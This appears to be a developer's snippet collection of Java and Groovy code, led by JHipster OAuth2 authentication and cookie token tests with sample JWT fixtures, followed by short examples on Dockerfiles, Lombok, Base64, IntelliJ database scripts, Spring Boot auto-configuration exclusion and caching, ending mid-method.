import org.springframework.security.oauth2.common.DefaultOAuth2AccessToken;
import org.springframework.security.oauth2.common.DefaultOAuth2RefreshToken;
import org.springframework.security.oauth2.common.OAuth2AccessToken;
import org.springframework.security.oauth2.common.exceptions.InvalidTokenException;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import static org.mockito.Mockito.when;

/**
 * Test password and refresh token grants.
 *
 * @see OAuth2AuthenticationService
 */
@RunWith(MockitoJUnitRunner.class)
public class OAuth2AuthenticationServiceTest {
    public static final String CLIENT_AUTHORIZATION = "Basic d2ViX2FwcDpjaGFuZ2VpdA==";
    public static final String ACCESS_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE0OTQyNzI4NDQsInVzZXJfbmFtZSI6InVzZXIiLCJhdXRob3JpdGllcyI6WyJST0xFX1VTRVIiXSwianRpIjoiNzc1ZTJkYWUtYWYzZi00YTdhLWExOTktNzNiZTU1MmIxZDVkIiwiY2xpZW50X2lkIjoid2ViX2FwcCIsInNjb3BlIjpbIm9wZW5pZCJdfQ.gEK0YcX2IpkpxnkxXXHQ4I0xzTjcy7edqb89ukYE0LPe7xUcZVwkkCJF_nBxsGJh2jtA6NzNLfY5zuL6nP7uoAq3fmvsyrcyR2qPk8JuuNzGtSkICx3kPDRjAT4ST8SZdeh7XCbPVbySJ7ZmPlRWHyedzLA1wXN0NUf8yZYS4ELdUwVBYIXSjkNoKqfWm88cwuNr0g0teypjPtjDqCnXFt1pibwdfIXn479Y1neNAdvSpHcI4Ost-c7APCNxW2gqX-0BItZQearxRgKDdBQ7CGPAIky7dA0gPuKUpp_VCoqowKCXqkE9yKtRQGIISewtj2UkDRZePmzmYrUBXRzfYw";
    public static final String REFRESH_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJ1c2VyIiwic2NvcGUiOlsib3BlbmlkIl0sImF0aSI6Ijc3NWUyZGFlLWFmM2YtNGE3YS1hMTk5LTczYmU1NTJiMWQ1ZCIsImV4cCI6MTQ5Njg2NDc0MywiYXV0aG9yaXRpZXMiOlsiUk9MRV9VU0VSIl0sImp0aSI6IjhmYjI2YTllLTdjYzQtNDFlMi1hNzBjLTk4MDc0N2U2YWFiOSIsImNsaWVudF9pZCI6IndlYl9hcHAifQ.q1-Df9_AFO6TJNiLKV2YwTjRbnd7qcXv52skXYnog5siHYRoR6cPtm6TNQ04iDAoIHljTSTNnD6DS3bHk41mV55gsSVxGReL8VCb_R8ZmhVL4-5yr90sfms0wFp6lgD2bPmZ-TXiS2Oe9wcbNWagy5RsEplZ-sbXu3tjmDao4FN35ojPsXmUs84XnNQH3Y_-PY9GjZG0JEfLQIvE0J5BkXS18Z015GKyA6GBIoLhAGBQQYyG9m10ld_a9fD5SmCyCF72Jad_pfP1u8Z_WyvO-wrlBvm2x-zBthreVrXU5mOb9795wJEP-xaw3dXYGjht_grcW4vKUFtj61JgZk98CQ";
    public static final String EXPIRED_SESSION_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJ1c2VyIiwic2NvcGUiOlsib3BlbmlkIl0sImF0aSI6IjE0NTkwYzdkLTQ5M2YtNDU0NS05MzlmLTg1ODM4ZjRmNzNmNSIsImV4cCI6MTQ5NTU3Mjg5MywiaWF0IjoxNDk1MzIwODkzLCJhdXRob3JpdGllcyI6WyJST0xFX1VTRVIiXSwianRpIjoiNzVhYTIxNzEtMzFmNi00MWJmLWExZGUtYWU0YTg1ZjZiMjEyIiwiY2xpZW50X2lkIjoid2ViX2FwcCJ9.gAH-yly7WAslQUeGhyHmjYXwQN3dluvoT84iOJ2mVWYGVlnDRsoxN3_d1ozqtiso9UM7dWpAr80o3gK7AyK-cO1GGBXa3lg0ETsbucFoqHLivgGZA2qVOsFlDq8E7DZENAbOWmywmhFUOogCfZ-BqsuFSi8waMLL-1qlhehBPuK1KzGxIZbjSVUFFFYTxoWPKi2NNTBzYSwwCV0ixj-gHyFC6Gl5ByA4EvYygGUZF2pACxs4tIRkmT90pXWCjWeKS9k9MlxZ7C4UHqyTRW-IYzqAm8OHdwsnXeu0GkFYc08gxoUuPcjMby8ziYLG5uWj0Ua0msmiSjoafzs-5xfH-Q";
    public static final String NEW_ACCESS_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE0OTQyNzY2NDEsInVzZXJfbmFtZSI6InVzZXIiLCJhdXRob3JpdGllcyI6WyJST0xFX1VTRVIiXSwianRpIjoiYzIyY2YzMDgtZTIyYi00YzNjLWI5MjctOTYwYzA2YmY1ZmU0IiwiY2xpZW50X2lkIjoid2ViX2FwcCIsInNjb3BlIjpbIm9wZW5pZCJdfQ.IAhE39GCqWRUuXdWy-raOcE9NYXRhGiqkeJH649501LeqNPH5HtRUNWmudVRgwT52Bj7HcbJapMLGetKIMEASqC1-WARfcZ_PR0r7Kfg3OlFALWOH_oVT5kvi2H-QCoSAF9mRYK6abCh_tPk5KryVB5c7YxTMIXDT2nTsSexD8eNQOMBWRCg0RaLHZ9bKfeyVgncQJsu7-vTo1xJyh-keYpdNZ0TA2SjYJgezmB7gwW1Kmc7_83htr8VycG7XA_PuD9--yRNlrN0LtNHEBqNypZsOe6NvpKiNlodFYHlsU1CaumzcF9U7dpVanjIUKJ5VRWVUlSFY6JJ755W29VCTw";
    public static final String NEW_REFRESH_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJ1c2VyIiwic2NvcGUiOlsib3BlbmlkIl0sImF0aSI6ImMyMmNmMzA4LWUyMmItNGMzYy1iOTI3LTk2MGMwNmJmNWZlNCIsImV4cCI6MTQ5Njg2ODU4MSwiYXV0aG9yaXRpZXMiOlsiUk9MRV9VU0VSIl0sImp0aSI6ImU4YmZhZWJlLWYzMDItNGNjZS1hZGY1LWQ4MzE5OWM1MjBlOSIsImNsaWVudF9pZCI6IndlYl9hcHAifQ.OemWBUfc-2rl4t4VVqolYxul3L527PbSbX2Xvo7oyy3Vy5nmmblqp4hVGdTEjivrlldGVQX03ERbrA-oFkpmfWbBzLvnKS6AUq1MGjut6dXZJeiEqNYmiAABn6jSgK26S0k6b2ADgmf7mxJO8EBypb5sT1DMAbY5cbOe7r4ZG7zMTVSvlvjHTXp_FM8Y9i6nehLD4XDYY57cb_ZA89vAXNzvTAjoopDliExgR0bApG6nvvDEhEYgTS65lccEQocoev6bISJ3RvNYNPJxWcNPftKDp4HrEt2E2WP28K5IivRtQgDQNlQeormf1tp6AG-Oj__NXyAPM7yhAKXNy2zWdQ";
    @Mock
    private RestTemplate restTemplate;
    @Mock
    private TokenStore tokenStore;
    private OAuth2TokenEndpointClient authorizationClient;
    private OAuth2AuthenticationService authenticationService;
    private RefreshTokenFilter refreshTokenFilter;
    @Rule
    public ExpectedException expectedException = ExpectedException.none();
    private OAuth2Properties oAuth2Properties;
    private JHipsterProperties jHipsterProperties;

    @Before
    public void init() {
        oAuth2Properties = new OAuth2Properties();
        jHipsterProperties = new JHipsterProperties();
        jHipsterProperties.getSecurity().getClientAuthorization().setAccessTokenUri("http://uaa/oauth/token");
        OAuth2CookieHelper cookieHelper = new OAuth2CookieHelper(oAuth2Properties);
        OAuth2AccessToken accessToken = createAccessToken(ACCESS_TOKEN_VALUE, REFRESH_TOKEN_VALUE);

        mockInvalidPassword();
        mockPasswordGrant(accessToken);
        mockRefreshGrant();

        authorizationClient = new UaaTokenEndpointClient(restTemplate, jHipsterProperties, oAuth2Properties);
        authenticationService = new OAuth2AuthenticationService(authorizationClient, cookieHelper);
        when(tokenStore.readAccessToken(ACCESS_TOKEN_VALUE)).thenReturn(accessToken);
        refreshTokenFilter = new RefreshTokenFilter(authenticationService, tokenStore);
    }

    public static OAuth2AccessToken createAccessToken(String accessTokenValue, String refreshTokenValue) {
        DefaultOAuth2AccessToken accessToken = new DefaultOAuth2AccessToken(accessTokenValue);
        accessToken.setExpiration(new Date());          //token expires now
        DefaultOAuth2RefreshToken refreshToken = new DefaultOAuth2RefreshToken(refreshTokenValue);
        accessToken.setRefreshToken(refreshToken);
        return accessToken;
    }

    public static MockHttpServletRequest createMockHttpServletRequest() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        Cookie refreshTokenCookie = new Cookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE, REFRESH_TOKEN_VALUE);
        request.setCookies(accessTokenCookie, refreshTokenCookie);
        return request;
    }

    private void mockInvalidPassword() {
        HttpHeaders reqHeaders = new HttpHeaders();
        reqHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        reqHeaders.add("Authorization", CLIENT_AUTHORIZATION);                //take over Authorization header from client request to UAA request
        MultiValueMap<String, String> formParams = new LinkedMultiValueMap<>();
        formParams.set("username", "user");
        formParams.set("password", "user2");
        formParams.add("grant_type", "password");
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(formParams, reqHeaders);
        when(restTemplate.postForEntity("http://uaa/oauth/token", entity, OAuth2AccessToken.class))
            .thenThrow(new HttpClientErrorException(HttpStatus.BAD_REQUEST));
    }

    private void mockPasswordGrant(OAuth2AccessToken accessToken) {
        HttpHeaders reqHeaders = new HttpHeaders();
        reqHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        reqHeaders.add("Authorization", CLIENT_AUTHORIZATION);                //take over Authorization header from client request to UAA request
        MultiValueMap<String, String> formParams = new LinkedMultiValueMap<>();
        formParams.set("username", "user");
        formParams.set("password", "user");
        formParams.add("grant_type", "password");
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(formParams, reqHeaders);
        when(restTemplate.postForEntity("http://uaa/oauth/token", entity, OAuth2AccessToken.class))
            .thenReturn(new ResponseEntity<OAuth2AccessToken>(accessToken, HttpStatus.OK));
    }

    private void mockRefreshGrant() {
        MultiValueMap<String, String> params = new LinkedMultiValueMap<>();
        params.add("grant_type", "refresh_token");
        params.add("refresh_token", REFRESH_TOKEN_VALUE);
        //we must authenticate with the UAA server via HTTP basic authentication using the browser's client_id with no client secret
        HttpHeaders headers = new HttpHeaders();
        headers.add("Authorization", CLIENT_AUTHORIZATION);
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(params, headers);
        OAuth2AccessToken newAccessToken = createAccessToken(NEW_ACCESS_TOKEN_VALUE, NEW_REFRESH_TOKEN_VALUE);
        when(restTemplate.postForEntity("http://uaa/oauth/token", entity, OAuth2AccessToken.class))
            .thenReturn(new ResponseEntity<OAuth2AccessToken>(newAccessToken, HttpStatus.OK));
    }

    @Test
    public void testAuthenticationCookies() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.test.com");
        request.addHeader("Authorization", CLIENT_AUTHORIZATION);
        Map<String, String> params = new HashMap<>();
        params.put("username", "user");
        params.put("password", "user");
        params.put("rememberMe", "true");
        MockHttpServletResponse response = new MockHttpServletResponse();
        authenticationService.authenticate(request, response, params);
        //check that cookies are set correctly
        Cookie accessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(ACCESS_TOKEN_VALUE, accessTokenCookie.getValue());
        Cookie refreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(REFRESH_TOKEN_VALUE, OAuth2CookieHelper.getRefreshTokenValue(refreshTokenCookie));
        Assert.assertTrue(OAuth2CookieHelper.isRememberMe(refreshTokenCookie));
    }

    @Test
    public void testAuthenticationNoRememberMe() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.test.com");
        Map<String, String> params = new HashMap<>();
        params.put("username", "user");
        params.put("password", "user");
        params.put("rememberMe", "false");
        MockHttpServletResponse response = new MockHttpServletResponse();
        authenticationService.authenticate(request, response, params);
        //check that cookies are set correctly
        Cookie accessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(ACCESS_TOKEN_VALUE, accessTokenCookie.getValue());
        Cookie refreshTokenCookie = response.getCookie(OAuth2CookieHelper.SESSION_TOKEN_COOKIE);
        Assert.assertEquals(REFRESH_TOKEN_VALUE, OAuth2CookieHelper.getRefreshTokenValue(refreshTokenCookie));
        Assert.assertFalse(OAuth2CookieHelper.isRememberMe(refreshTokenCookie));
    }

    @Test
    public void testInvalidPassword() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.test.com");
        Map<String, String> params = new HashMap<>();
        params.put("username", "user");
        params.put("password", "user2");
        params.put("rememberMe", "false");
        MockHttpServletResponse response = new MockHttpServletResponse();
        expectedException.expect(InvalidPasswordException.class);
        authenticationService.authenticate(request, response, params);
    }

    @Test
    public void testRefreshGrant() {
        MockHttpServletRequest request = createMockHttpServletRequest();
        MockHttpServletResponse response = new MockHttpServletResponse();
        HttpServletRequest newRequest = refreshTokenFilter.refreshTokensIfExpiring(request, response);
        Cookie newAccessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(NEW_ACCESS_TOKEN_VALUE, newAccessTokenCookie.getValue());
        Cookie newRefreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(NEW_REFRESH_TOKEN_VALUE, newRefreshTokenCookie.getValue());
        Cookie requestAccessTokenCookie = OAuth2CookieHelper.getAccessTokenCookie(newRequest);
        Assert.assertEquals(NEW_ACCESS_TOKEN_VALUE, requestAccessTokenCookie.getValue());
    }

    @Test
    public void testSessionExpired() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        Cookie refreshTokenCookie = new Cookie(OAuth2CookieHelper.SESSION_TOKEN_COOKIE, EXPIRED_SESSION_TOKEN_VALUE);
        request.setCookies(accessTokenCookie, refreshTokenCookie);
        MockHttpServletResponse response = new MockHttpServletResponse();
        HttpServletRequest newRequest = refreshTokenFilter.refreshTokensIfExpiring(request, response);
        //cookies in response are deleted
        Cookie newAccessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(0, newAccessTokenCookie.getMaxAge());
        Cookie newRefreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(0, newRefreshTokenCookie.getMaxAge());
        //request no longer contains cookies
        Cookie requestAccessTokenCookie = OAuth2CookieHelper.getAccessTokenCookie(newRequest);
        Assert.assertNull(requestAccessTokenCookie);
        Cookie requestRefreshTokenCookie = OAuth2CookieHelper.getRefreshTokenCookie(newRequest);
        Assert.assertNull(requestRefreshTokenCookie);
    }

    /**
     * If no refresh token is found and the access token has expired, then expect an exception.
     */
    @Test
    public void testRefreshGrantNoRefreshToken() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        request.setCookies(accessTokenCookie);
        MockHttpServletResponse response = new MockHttpServletResponse();
        expectedException.expect(InvalidTokenException.class);
        refreshTokenFilter.refreshTokensIfExpiring(request, response);
    }

    @Test
    public void testLogout() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        Cookie refreshTokenCookie = new Cookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE, REFRESH_TOKEN_VALUE);
        request.setCookies(accessTokenCookie, refreshTokenCookie);
        MockHttpServletResponse response = new MockHttpServletResponse();
        authenticationService.logout(request, response);
        Cookie newAccessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(0, newAccessTokenCookie.getMaxAge());
        Cookie newRefreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(0, newRefreshTokenCookie.getMaxAge());
    }

    @Test
    public void testStripTokens() {
        MockHttpServletRequest request = createMockHttpServletRequest();
        HttpServletRequest newRequest = authenticationService.stripTokens(request);
        CookieCollection cookies = new CookieCollection(newRequest.getCookies());
        Assert.assertFalse(cookies.contains(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE));
        Assert.assertFalse(cookies.contains(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE));
    }
}

 
 
 
 
package com.baeldung.jhipster.gateway.security.oauth2;

import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.springframework.http.HttpMethod;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.security.core.Authentication;
import org.springframework.security.oauth2.common.OAuth2AccessToken;

/**
 * Test whether the CookieTokenExtractor can properly extract access tokens from
 * Cookies and Headers.
 */
public class CookieTokenExtractorTest {
    private CookieTokenExtractor cookieTokenExtractor;

    @Before
    public void init() {
        cookieTokenExtractor = new CookieTokenExtractor();
    }

    @Test
    public void testExtractTokenCookie() {
        MockHttpServletRequest request = OAuth2AuthenticationServiceTest.createMockHttpServletRequest();
        Authentication authentication = cookieTokenExtractor.extract(request);
        Assert.assertEquals(OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE, authentication.getPrincipal().toString());
    }

    @Test
    public void testExtractTokenHeader() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        request.addHeader("Authorization", OAuth2AccessToken.BEARER_TYPE + " " + OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE);
        Authentication authentication = cookieTokenExtractor.extract(request);
        Assert.assertEquals(OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE, authentication.getPrincipal().toString());
    }

    @Test
    public void testExtractTokenParam() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        request.addParameter(OAuth2AccessToken.ACCESS_TOKEN, OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE);
        Authentication authentication = cookieTokenExtractor.extract(request);
        Assert.assertEquals(OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE, authentication.getPrincipal().toString());
    }
}

 
https://blog.csdn.net/liusanyu/article/details/78840483
 
 
@RunWith(SpringRunner.class)
@DataJpaTest
@AutoConfigureEmbeddedDatabase
public class SpringDataJpaAnnotationTest {

    @Autowired
    private PersonRepository personRepository;

    @Test
    public void testEmbeddedDatabase() {
        Optional<Person> personOptional = personRepository.findById(1L);

        assertThat(personOptional).hasValueSatisfying(person -> {
            assertThat(person.getId()).isNotNull();
            assertThat(person.getFirstName()).isEqualTo("Dave");
            assertThat(person.getLastName()).isEqualTo("Syer");
        });
    }
}

Standard Dockerfile
FROM openjdk:8-jdk

RUN groupadd --system --gid 1000 test
RUN useradd --system --gid test --uid 1000 --shell /bin/bash --create-home test

USER test
WORKDIR /home/test
Alpine Dockerfile
FROM openjdk:8-jdk-alpine

RUN addgroup -S -g 1000 test
RUN adduser -D -S -G test -u 1000 -s /bin/ash test

USER test
WORKDIR /home/test
--------------------------------------------------------------------------------------------------------
import lombok.experimental.ExtensionMethod;

@ExtensionMethod({java.util.Arrays.class, Extensions.class})
public class ExtensionMethodExample {
  public String test() {
    int[] intArray = {5, 3, 8, 2};
    intArray.sort();
    
    String iAmNull = null;
    return iAmNull.or("hELlO, WORlD!".toTitleCase());
  }
}

class Extensions {
  public static <T> T or(T obj, T ifNull) {
    return obj != null ? obj : ifNull;
  }
  
  public static String toTitleCase(String in) {
    if (in.isEmpty()) return in;
    return "" + Character.toTitleCase(in.charAt(0)) +
        in.substring(1).toLowerCase();
  }
}


 public class ExtensionMethodExample {
  public String test() {
    int[] intArray = {5, 3, 8, 2};
    java.util.Arrays.sort(intArray);
    
    String iAmNull = null;
    return Extensions.or(iAmNull, Extensions.toTitleCase("hELlO, WORlD!"));
  }
}

class Extensions {
  public static <T> T or(T obj, T ifNull) {
    return obj != null ? obj : ifNull;
  }
  
  public static String toTitleCase(String in) {
    if (in.isEmpty()) return in;
    return "" + Character.toTitleCase(in.charAt(0)) +
        in.substring(1).toLowerCase();
  }
}
--------------------------------------------------------------------------------------------------------
	headers.add(new InternetHeader("Return-Path", null));
	headers.add(new InternetHeader("Received", null));
	headers.add(new InternetHeader("Resent-Date", null));
	headers.add(new InternetHeader("Resent-From", null));
	headers.add(new InternetHeader("Resent-Sender", null));
	headers.add(new InternetHeader("Resent-To", null));
	headers.add(new InternetHeader("Resent-Cc", null));
	headers.add(new InternetHeader("Resent-Bcc", null));
	headers.add(new InternetHeader("Resent-Message-Id", null));
	headers.add(new InternetHeader("Date", null));
	headers.add(new InternetHeader("From", null));
	headers.add(new InternetHeader("Sender", null));
	headers.add(new InternetHeader("Reply-To", null));
	headers.add(new InternetHeader("To", null));
	headers.add(new InternetHeader("Cc", null));
	headers.add(new InternetHeader("Bcc", null));
	headers.add(new InternetHeader("Message-Id", null));
	headers.add(new InternetHeader("In-Reply-To", null));
	headers.add(new InternetHeader("References", null));
	headers.add(new InternetHeader("Subject", null));
	headers.add(new InternetHeader("Comments", null));
	headers.add(new InternetHeader("Keywords", null));
	headers.add(new InternetHeader("Errors-To", null));
	headers.add(new InternetHeader("MIME-Version", null));
	headers.add(new InternetHeader("Content-Type", null));
	headers.add(new InternetHeader("Content-Transfer-Encoding", null));
	headers.add(new InternetHeader("Content-MD5", null));
	headers.add(new InternetHeader(":", null));
	headers.add(new InternetHeader("Content-Length", null));
	headers.add(new InternetHeader("Status", null));
--------------------------------------------------------------------------------------------------------
import com.intellij.database.model.DasTable
import com.intellij.database.util.Case
import com.intellij.database.util.DasUtil

/*
 * Available context bindings:
 *   SELECTION   Iterable<DasObject>
 *   PROJECT     project
 *   FILES       files helper
 */

packageName = "com.sample;"
typeMapping = [
  (~/(?i)int/)                      : "long",
  (~/(?i)float|double|decimal|real/): "double",
  (~/(?i)datetime|timestamp/)       : "java.sql.Timestamp",
  (~/(?i)date/)                     : "java.sql.Date",
  (~/(?i)time/)                     : "java.sql.Time",
  (~/(?i)/)                         : "String"
]

FILES.chooseDirectoryAndSave("Choose directory", "Choose where to store generated files") { dir ->
  SELECTION.filter { it instanceof DasTable }.each { generate(it, dir) }
}

def generate(table, dir) {
  def className = javaName(table.getName(), true)
  def fields = calcFields(table)
  new File(dir, className + ".java").withPrintWriter { out -> generate(out, className, fields) }
}

def generate(out, className, fields) {
  out.println "package $packageName"
  out.println ""
  out.println ""
  out.println "public class $className {"
  out.println ""
  fields.each() {
    if (it.annos != "") out.println "  ${it.annos}"
    out.println "  private ${it.type} ${it.name};"
  }
  out.println ""
  fields.each() {
    out.println ""
    out.println "  public ${it.type} get${it.name.capitalize()}() {"
    out.println "    return ${it.name};"
    out.println "  }"
    out.println ""
    out.println "  public void set${it.name.capitalize()}(${it.type} ${it.name}) {"
    out.println "    this.${it.name} = ${it.name};"
    out.println "  }"
    out.println ""
  }
  out.println "}"
}

def calcFields(table) {
  DasUtil.getColumns(table).reduce([]) { fields, col ->
    def spec = Case.LOWER.apply(col.getDataType().getSpecification())
    def typeStr = typeMapping.find { p, t -> p.matcher(spec).find() }.value
    fields += [[
                 name : javaName(col.getName(), false),
                 type : typeStr,
                 annos: ""]]
  }
}

def javaName(str, capitalize) {
  def s = com.intellij.psi.codeStyle.NameUtil.splitNameIntoWords(str)
    .collect { Case.LOWER.apply(it).capitalize() }
    .join("")
    .replaceAll(/[^\p{javaJavaIdentifierPart}[_]]/, "_")
  capitalize || s.length() == 1? s : Case.LOWER.apply(s[0]) + s[1..-1]
}
--------------------------------------------------------------------------------------------------------
/*
 * Available context bindings:
 *   COLUMNS     List<DataColumn>
 *   ROWS        Iterable<DataRow>
 *   OUT         { append() }
 *   FORMATTER   { format(row, col); formatValue(Object, col) }
 *   TRANSPOSED  Boolean
 * plus ALL_COLUMNS, TABLE, DIALECT
 *
 * where:
 *   DataRow     { rowNumber(); first(); last(); data(): List<Object>; value(column): Object }
 *   DataColumn  { columnNumber(), name() }
 */


import java.util.regex.Pattern

NEWLINE = System.getProperty("line.separator")

pattern = Pattern.compile("[^\\w\\d]")
def escapeTag(name) {
  name = pattern.matcher(name).replaceAll("_")
  return name.isEmpty() || !Character.isLetter(name.charAt(0)) ? "_$name" : name
}
def printRow = { values, rowTag, namer, valueToString ->
  OUT.append("$NEWLINE<$rowTag>$NEWLINE")
  values.eachWithIndex { it, index ->
    def tag = namer(it, index)
    def str = valueToString(it)
    OUT.append("  <$tag>$str</$tag>$NEWLINE")
  }
  OUT.append("</$rowTag>")
}

OUT.append(
"""<?xml version="1.0" encoding="UTF-8"?>
<data>""")

if (!TRANSPOSED) {
  ROWS.each { row -> printRow(COLUMNS, "row", {it, _ -> escapeTag(it.name())}) { FORMATTER.format(row, it) } }
}
else {
  def values = COLUMNS.collect { new ArrayList<String>() }
  ROWS.each { row -> COLUMNS.eachWithIndex { col, i -> values[i].add(FORMATTER.format(row, col)) } }
  values.eachWithIndex { it, index -> printRow(it, escapeTag(COLUMNS[index].name()), { _, i -> "row${i + 1}" }, { it }) }
}

OUT.append("""
</data>
""")
--------------------------------------------------------------------------------------------------------
import java.util.Base64;
import java.util.UUID;
import java.io.UnsupportedEncodingException;

public class HelloWorld {

   public static void main(String args[]) {

      try {
		
         // Encode using basic encoder
         String base64encodedString = Base64.getEncoder().encodeToString(
            "TutorialsPoint?java8".getBytes("utf-8"));
         System.out.println("Base64 Encoded String (Basic) :" + base64encodedString);
		
         // Decode
         byte[] base64decodedBytes = Base64.getDecoder().decode(base64encodedString);
		
         System.out.println("Original String: " + new String(base64decodedBytes, "utf-8"));
         base64encodedString = Base64.getUrlEncoder().encodeToString(
            "TutorialsPoint?java8".getBytes("utf-8"));
         System.out.println("Base64 Encoded String (URL) :" + base64encodedString);
		
         StringBuilder stringBuilder = new StringBuilder();
		
         for (int i = 0; i < 10; ++i) {
            stringBuilder.append(UUID.randomUUID().toString());
         }
		
         byte[] mimeBytes = stringBuilder.toString().getBytes("utf-8");
         String mimeEncodedString = Base64.getMimeEncoder().encodeToString(mimeBytes);
         System.out.println("Base64 Encoded String (MIME) :" + mimeEncodedString);

      } catch(UnsupportedEncodingException e) {
         System.out.println("Error :" + e.getMessage());
      }
   }
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = Application.class, webEnvironment = WebEnvironment.DEFINED_PORT)
@TestPropertySource(properties = 
 "spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration")
public class ExcludeAutoConfigIntegrationTest {
    // ...
}


@RunWith(SpringRunner.class)
@SpringBootTest(classes = Application.class, webEnvironment = WebEnvironment.DEFINED_PORT)
@ActiveProfiles("test")
public class ExcludeAutoConfigIntegrationTest {
    // ...
}
spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration


@RunWith(SpringRunner.class)
@SpringBootTest(classes = Application.class, webEnvironment = WebEnvironment.DEFINED_PORT)
@EnableAutoConfiguration(exclude=SecurityAutoConfiguration.class)
public class ExcludeAutoConfigIntegrationTest {
 
    @Test
    public void givenSecurityConfigExcluded_whenAccessHome_thenNoAuthenticationRequired() {
        int statusCode = RestAssured.get("http://localhost:8080/").statusCode();
         
        assertEquals(HttpStatus.OK.value(), statusCode);
    }
}


@SpringBootApplication(exclude=SecurityAutoConfiguration.class)
public class TestApplication {
 
    public static void main(String[] args) {
        SpringApplication.run(TestApplication.class, args);
    }
}

@RunWith(SpringRunner.class)
@SpringBootTest(classes = TestApplication.class, webEnvironment = WebEnvironment.DEFINED_PORT)
public class ExcludeAutoConfigIntegrationTest {
    // ...
}

---
spring:
  profiles: test
  autoconfigure.exclude: org.springframework.boot.autoconfigure.session.SessionAutoConfiguration
--------------------------------------------------------------------------------------------------------
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT, properties="spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration")
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableCaching
@EnableScheduling
public class CachingConfig {
    public static final String GAMES = "GAMES";
    @Bean
    public CacheManager cacheManager() {
        ConcurrentMapCacheManager cacheManager = new ConcurrentMapCacheManager(GAMES);

        return cacheManager;
    }

@CacheEvict(allEntries = true, value = {GAMES})
@Scheduled(fixedDelay = 10 * 60 * 1000 ,  initialDelay = 500)
public void reportCacheEvict() {
    System.out.println("Flush Cache " + dateFormat.format(new Date()));
}

@Configuration
@EnableCaching
public class CacheConfig {

   public final static String CACHE_ONE = "cacheOne";
   public final static String CACHE_TWO = "cacheTwo";

   @Bean
   public Cache cacheOne() {
      return new GuavaCache(CACHE_ONE, CacheBuilder.newBuilder()
            .expireAfterWrite(60, TimeUnit.MINUTES)
            .build());
   }

   @Bean
   public Cache cacheTwo() {
